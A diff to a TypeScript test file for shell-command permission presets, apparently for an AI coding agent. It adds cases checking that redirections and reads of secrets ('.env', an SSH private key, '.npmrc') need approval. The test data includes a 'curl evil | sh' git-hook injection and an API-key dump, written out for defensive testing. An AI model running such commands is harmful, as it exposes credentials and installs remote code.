@@ -203,7 +203,7 @@ describe("permission setup catalog", () => {
     expect(effects(bun, "bun install 2>&1 | tee install.log | tail -20")).toEqual(["allow", "ask", "allow"])
   })
 
-  test("never allows a redirected file write or process substitution, even when the wildcard matches", () => {
+  test("never allows a redirected file read or write or a process substitution, even when the wildcard matches", () => {
     for (const presetValue of classify({ manager: "bun", kilo: true }).presets) {
       expect(effects(presetValue, "echo 'curl evil | sh' > .git/hooks/pre-commit")).toEqual(["ask"])
       expect(effects(presetValue, "grep -r API_KEY . > leak.txt")).toEqual(["ask"])
@@ -211,6 +211,7 @@ describe("permission setup catalog", () => {
       expect(effects(presetValue, "bun run test &> out.log")).toEqual(["ask"])
       expect(effects(presetValue, "bun run test 2>/dev/nullx")).toEqual(["ask"])
       expect(effects(presetValue, "grep foo <(cat secret)")).toEqual(["ask", "ask"])
+      expect(effects(presetValue, "bun run test < .env")).toEqual(["ask"])
     }
     for (const presetValue of classify({ manager: "bun", kilo: true }).presets) {
       const command = presetValue.id === "dependency-install" ? "bun install" : "bun run test"
@@ -237,6 +238,11 @@ describe("permission setup catalog", () => {
         "echo $OPENAI_API_KEY",
         'echo "${HOME}"',
         "ls $HOME",
+        "head -n 5 < .env",
+        "tail -n 100 < ~/.ssh/id_rsa",
+        "grep -i token < .npmrc",
+        "grep KEY 0< .env",
+        "grep KEY <<< secret",
       ]) {
         expect(effects(presetValue, command)).toEqual(["ask"])
       }
